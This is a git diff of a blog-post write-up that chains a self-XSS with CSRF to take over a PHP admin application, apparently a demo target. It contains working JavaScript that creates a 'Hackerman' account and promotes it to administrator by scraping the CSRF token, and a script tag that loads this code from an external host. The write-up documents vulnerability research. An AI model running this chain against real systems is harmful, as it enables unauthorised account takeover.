@@ -14,8 +14,6 @@ tags:
 
 
 # i. Introduction
-[add introduction note]
-
 While hunting around on the application, I found a section where you can create users. After playing around, I noticed that when the registration would fail due to errors in the form such as a invalid username, too short password, etc, the username that you were trying to register would reflect on the error page.
 
 ![Screenshot]({{ site.baseurl }}/images/posts/2017/xavier/fail.png)
@@ -24,7 +22,7 @@ I then tried adding an XSS payload to see if the parameter would be sanitized in
 
 ![Screenshot]({{ site.baseurl }}/images/posts/2017/xavier/xss.png)
 
-However, this would be considered to be a `Self-XSS` and have very little impact.
+However, this would be considered to be a `Self-XSS` which has very low impact as it requires social engineering in order to remotely exploit.
 
 
 # ii. Chaining CSRF with XSS
@@ -33,7 +31,7 @@ Feeling a little defeated, I thought of some ways I could leverage this XSS into
 
 Here is an example of how the request looks like:
 
-![Screenshot]({{ site.baseurl }}/images/posts/2017/xavier/csrf.png)
+![Screenshot]({{ site.baseurl }}/images/posts/2017/xavier/csrf-payload.png)
 
 ~~~
 Payload Used: <script>alert(1)</script>
@@ -64,16 +62,14 @@ If you are thinking, if we have a CSRF, why go through all the trouble of having
 
 With that in mind, I set off to find a way to be able to takeover the application chaining these two bugs.
 
-xyz (Simialr to my earlier post)
-
-I then wrote simple Javascript, when called will create a new user and then promote the user. This is able to bypass SOP, as the request will be executing from the application, and furthermore is able to bypass the CSRF protection when promoting a user to the administrator as we can create an XMLHTTPRequest to parse the CSRF token and then include it with our request.
+I then wrote simple Javascript, when called will create a new user and then promote the user. This is able to bypass SOP, as the request will be executing from the application. Furthermore this is also able to bypass the CSRF protection when promoting a user to the administrator as we can create an XMLHTTPRequest to parse the CSRF token and then include it with our subsequent request.
 
 If you host the following Javascript on your site:
 ~~~
 var root = "";
 var req = new XMLHttpRequest();
 var url = root + "/xavier-demo/admin/includes/adminprocess.php";
-var params = "user=Hackerman&firstname=Hackerman&lastname=Hackerman&pass=SupermanSuperman&conf_pass=SupermanSuperman& email=Hackerman%40Superman.com&conf_email=Hackerman%40Superman.com&form_submission=admin_registration";
+var params = "user=Hackerman&firstname=Hackerman&lastname=Hackerman&pass=P4ssw0rd&conf_pass=P4ssw0rd& email=Hackerman%40Superman.com&conf_email=Hackerman%40Superman.com&form_submission=admin_registration";
 req.open("POST", url, true);
 req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 req.send(params);
@@ -91,14 +87,24 @@ req2.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 req2.send(params2);
 ~~~
 
+This will create a user with the username Hackerman, password: P4ssw0rd with Administrator privileges.
+
 Then use a payload such as:
 ~~~
 <script src="https://your-site.com/xavier.js"></script>
 ~~~
 
+Create a CSRF Poc which will look similar to:
+![Screenshot]({{ site.baseurl }}/images/posts/2017/xavier/csrf2.png)
+
+End result:
+![Screenshot]({{ site.baseurl }}/images/posts/2017/xavier/takeover.gif)
 
 
+So essentially with a Self-XSS and some creative thinking we were able to takeover an application. 
 
+
+# iv. Conclusion
 
 As always, thank you for reading.
 
